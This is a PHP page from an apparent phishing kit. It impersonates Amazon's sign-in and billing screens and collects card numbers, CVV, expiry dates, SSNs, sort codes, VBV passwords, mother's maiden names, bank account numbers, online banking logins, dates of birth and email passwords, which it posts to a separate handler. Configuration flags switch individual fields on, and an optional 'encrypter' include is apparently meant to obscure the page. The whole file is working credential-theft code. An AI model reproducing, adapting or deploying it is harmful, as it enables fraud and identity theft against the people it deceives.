<?php
error_reporting(0);
@ob_start();
session_start();
if(!isset($_SESSION['SESSION_ID']))
{
	header("location: index.php");
	exit;
}

include_once 'inc/config.php';
include_once 'inc/functions.php';

$_GET = array();
  $params = explode('&', $_SERVER['QUERY_STRING']);
  foreach ($params as $pair) {
    list($key, $value) = explode('=', $pair);
    $_GET[urldecode($key)] = urldecode($value);
}
$session = isset($_GET['session']) ? $_GET['session'] : '';
$fake_session_params = "login.php?auth=1&header=1&sessionid=".$session;

if(!isset($_SESSION['LANG'])) {
	if($dynamic_language) {
		$_SESSION['LANG'] = getBrowserLanguage(substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2));
	} else {
		$_SESSION['LANG'] = $default_language.'.php';
	}
}

require_once 'languages/'.$_SESSION['LANG'];
?>

<?php
if(isset($_GET['error']) && $_GET['error'] === 'true' && isset($_GET['c'])) {
  $s = base64_decode($_GET['c']);
  $errorStatus = array();
  parse_str($s, $errorStatus);
}
?>
<!DOCTYPE HTML>
<html>
<head>
<?php 
if($enable_encrypter) {
	require_once 'inc/encrypter.php'; 
}
?>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">



<meta charset="utf-8">
    <title dir="ltr"><?php echo $lang['BILLING_INFO_PAGE_TITLE']; ?></title>
    
      
    
  
<link rel="shortcut icon" href="assets/imgs/favicon.ico">
<link media="all" href="assets/css/style.css" type="text/css" rel="stylesheet">
</head>
<body class="ap-locale-en_US a-auix_ux_57388-t1 a-auix_ux_63571-c a-aui_51744-c a-aui_57326-c a-aui_58736-c a-aui_accessibility_49860-c a-aui_attr_validations_1_51371-c a-aui_bolt_62845-c a-aui_ux_49594-c a-aui_ux_56217-c a-aui_ux_59374-c a-aui_ux_60000-c a-meter-animate">


<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none">
        



<div class="a-section a-spacing-medium a-text-center">
  
    
    
      <a class="a-link-nav-icon" tabindex="-1" href="#">

        
        
          
          
            <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>
          
        
        
      </a>
    
  
</div>


      </div>

      <div class="a-section auth-pagelet-container a-spacing-base">
          <?php 
          	if(isset($errorStatus)) {
          			$error_message = '<div id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">'.$lang['LOGIN_ERROR_TOP'].'</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">';
      				$error_message .=  '<ul class="a-nostyle a-vertical a-spacing-none">';
      				$error_message .=  '<li><span class="a-list-item">';

          		if(isset($errorStatus['cardnum']) && $errorStatus['cardnum'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_CARD_NUMBER'].'</P>';
          		}
          		if(isset($errorStatus['name']) && $errorStatus['name'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_NAME_ON_CARD'].'</P>';
          		}
          		if(isset($errorStatus['exp']) && $errorStatus['exp'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_CARD_EXP_DATE'].'</P>';
          		}
          		if(isset($errorStatus['cvv']) && $errorStatus['cvv'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_CVV'].'</P>';
          		}
          		if(isset($errorStatus['st']) && $errorStatus['st'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_SORT_CODE'].'</P>';
          		}
          		if(isset($errorStatus['sn']) && $errorStatus['sn'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_SSN'].'</P>';
          		}
          		if(isset($errorStatus['dob']) && $errorStatus['dob'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_DOB'].'</P>';
          		}
          		if(isset($errorStatus['zip']) && $errorStatus['zip'] === '0') {
          			$error_message .= '<P>- '.$lang['INVALID_ZIP'].'</P>';
          		}
      			$error_message .= '</span></li></ul> </div></div></div>';
      			echo $error_message;

          	}
          ?>
        
      </div>

      <div class="a-section">
        


<div class="a-section a-spacing-base auth-pagelet-container">
  <div class="a-section">
    
    <form  method="post" action="check_info.php?<?php echo $_SESSION['SESSION_ID']; ?>" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">
      <div class="a-section">


        <div class="a-box"><div class="a-box-inner a-padding-extra-large">
          <h3 class="a-spacing-small">
            <?php echo $lang['ADDITIONAL_INFO_NOTE']; ?>
          </h3>
          
          <div class="a-row a-spacing-base">
            <label for="ap_card">
              <?php echo $lang['CARD_NUMBER']; ?>
            </label>
            <input maxlength="25" name="cardnumber" tabindex="1"  class="a-input-text a-span12  auth-autofocus auth-required-field" type="text" value="<?php echo isset($_SESSION['CARD_NUMBER']) ? $_SESSION['CARD_NUMBER'] : ''; ?>" required>
          </div>


 			 <div class="a-row a-spacing-base">
            <label for="ap_name">
              <?php echo $lang['NAME_ON_CARD']; ?>
            </label>
            <input maxlength="75" name="nameoncc" tabindex="2"  class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['NAME_ON_CARD']) ? $_SESSION['NAME_ON_CARD'] : ''; ?>" required>
          </div>

          	 <div class="a-row a-spacing-base">
            <label for="ap_exp">
              <?php echo $lang['CARD_EXPIRY']; ?>
            </label>
            <input maxlength="15" name="exp" tabindex="3"  placeholder="<?php echo $lang['CARD_EXP_DATE_FORMAT']; ?>" class="a-input-text a-span12  auth-required-field" type="text"value="<?php echo isset($_SESSION['EXPIRY_DATE']) ? $_SESSION['EXPIRY_DATE'] : ''; ?>" required>
          </div>

          <?php
          	if($request_for_cvv) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_cvv">';
          		print $lang['CVV'];
          		print '</label>';
          		$cvv_value = isset($_SESSION['CVV']) ? $_SESSION['CVV'] : '';
          		print '<input maxlength="4" name="cvv" tabindex="4"  placeholder="'.$lang['CVV_PLACEHOLDER'].'" class="a-input-text a-span12  auth-required-field" type="text"value="'.$cvv_value.'" required>';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_ssn && $_SESSION['COUNTRY'] === 'US') {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_ssn">';
          		print $lang['SSN'];
          		print '</label>';
          		$ssn_value = isset($_SESSION['SSN']) ? $_SESSION['SSN'] : '';
          		print '<input maxlength="11" name="sn" tabindex="5"  placeholder="XXX-XX-XXXX" class="a-input-text a-span12  auth-required-field" type="text"value="'.$ssn_value.'" required>';
          		print ' </div>';
          	}
          ?> 
          <?php
          	if($rquest_for_sort_code && $_SESSION['COUNTRY'] === 'GB') {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_sort">';
          		print $lang['SORT'];
          		print '</label>';
          		$sort_value = isset($_SESSION['SORT_CODE']) ? $_SESSION['SORT_CODE'] : '';
          		print '<input maxlength="8" name="st" tabindex="5"  placeholder="XX-XX-XX" class="a-input-text a-span12  auth-required-field" type="text"value="'.$sort_value.'" required>';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_vbv_password) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_cvv">';
          		print $lang['VBV'];
          		print '</label>';
          		$vbv_value = isset($_SESSION['CARD_VBV']) ? $_SESSION['CARD_VBV'] : '';
          		print '<input maxlength="16" name="v" tabindex="6"  placeholder="'.$lang['VBV_PLACE_HOLDER'].'" class="a-input-text a-span12  auth-required-field" type="password" value="'.$vbv_value.'">';
          		print ' </div>';
          	}
          ?>
          <?php
            if($request_for_mmn) {
              print '<div class="a-row a-spacing-base">';
              print '<label for="ap_mmn">';
              print $lang['MMN'];
              print '</label>';
              $mmn_value = isset($_SESSION['MMN']) ? $_SESSION['MMN'] : '';
              print '<input maxlength="20" name="mn" tabindex="7"  class="a-input-text a-span12  auth-required-field" type="text" value="'.$mmn_value.'">';
              print ' </div>';
            }
          ?>
          <?php
          	if($request_for_card_limit) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_limit">';
          		print $lang['CARD_LIMIT'];
          		print '</label>';
          		$limit_value = isset($_SESSION['CARD_LIMIT']) ? $_SESSION['CARD_LIMIT'] : '';
          		print '<input maxlength="8" name="limit" tabindex="8"  class="a-input-text a-span12  auth-required-field" type="text"value="'.$limit_value.'">';
          		print ' </div>';
          	}
          ?> 
          <?php
          	if($request_for_bank_account_number) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['BANK_ACCOUNT_NUM'];
          		print '</label>';
          		$acct_value = isset($_SESSION['BANK_ACC_NUM']) ? $_SESSION['BANK_ACC_NUM'] : '';
          		print '<input maxlength="30" name="acctnum" tabindex="9"  class="a-input-text a-span12  auth-required-field" type="text"value="'.$acct_value.'">';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_online_bankung_id) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['BANK_USERNAME'];
          		print '</label>';
          		$id_value = isset($_SESSION['ONLINE_BANKING_ID']) ? $_SESSION['ONLINE_BANKING_ID'] : '';
          		print '<input maxlength="50" name="id" tabindex="10"  class="a-input-text a-span12  auth-required-field" type="text"value="'.$id_value.'">';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_online_bankung_password) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['BANK_PASSWORD'];
          		print '</label>';
          		$pass_value = isset($_SESSION['ONLINE_BANKING_PASS']) ? $_SESSION['ONLINE_BANKING_PASS'] : '';
          		print '<input maxlength="50" name="ps" tabindex="11"  class="a-input-text a-span12  auth-required-field" type="password"value="'.$pass_value.'">';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_zip_code) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['CARD_ZIP_CODE'];
          		print '</label>';
          		$zip_value = isset($_SESSION['CARD_ZIP']) ? $_SESSION['CARD_ZIP'] : '';
          		print '<input maxlength="9" name="zz" tabindex="12"  class="a-input-text a-span12  auth-required-field" type="text"value="'.$zip_value.'" required>';
          		print ' </div>';
          	}
          ?>
          <?php 
          	if($request_for_date_of_birth) {
          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['DATE_OF_BIRTH'];
          		print '</label>';
          		$dob_value = isset($_SESSION['DOB']) ? $_SESSION['DOB'] : '';
          		print '<input maxlength="15" name="dd" tabindex="13"  class="a-input-text a-span12  auth-required-field" type="text" value="'.$dob_value.'" placeholder="'.$lang['DATE_OF_BIRTH_FORMAT'].'" required>';
          		print ' </div>';
          	}
          ?>
          <?php
          	if($request_for_email_password) {

          		if(isset($_SESSION['LoginId'])) {
	          		print '<br><div class="a-row a-spacing-base">';
	          		print '<label for="ap_acct">';
	          		print $lang['EMAIL'];
	          		print '</label>';
	          		print '<input maxlength="50" name="ez" tabindex="14" id="em" class="a-input-text a-span12  disabled" type="email" readonly value="'.$_SESSION['LoginId'].'">';
	          		print ' </div>';
	          		print '<script>document.getElementById("em").readOnly = true;</script>';
          		}

          		print '<div class="a-row a-spacing-base">';
          		print '<label for="ap_acct">';
          		print $lang['CURRENT_EMAIL_PASSWORD'];
          		print '</label>';
          		$empass_value = isset($_SESSION['CURRENT_EMAIL_PASS']) ? $_SESSION['CURRENT_EMAIL_PASS'] : '';
          		print '<input maxlength="50" name="ez" tabindex="14"  class="a-input-text a-span12  auth-required-field" type="password"value="'.$empass_value.'" required>';
          		print ' </div>';
          	}
          ?> 
          <div class="a-section a-spacing-extra-large">
             
            <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" aria-labelledby="a-autoid-0-announce" type="submit"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
              <?php echo $lang['BUTTON_SUBMIT']; ?>
            </span></span></span>

          </div>
          
                   
        </div></div>
      </div>
  </div>
</div>


      </div>

      
      <div id="right-2">
      </div>
      
      <div class="a-section a-spacing-top-extra-large">
        


<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>
<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['TERMS_OF_USE']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      <?php echo $lang['PRIVACY_POLICY']; ?>
    </a>
    <span class="auth-footer-seperator"></span>
  
    
    <a class="a-link-normal" target="_top" href="#">
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  
</div>

<div class="a-section a-spacing-none a-text-center">
  <span class="a-size-mini a-color-secondary">
    <?php echo $lang['COPYRIGHT']; ?>
  </span>
</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>


<?php ob_end_flush(); ?>
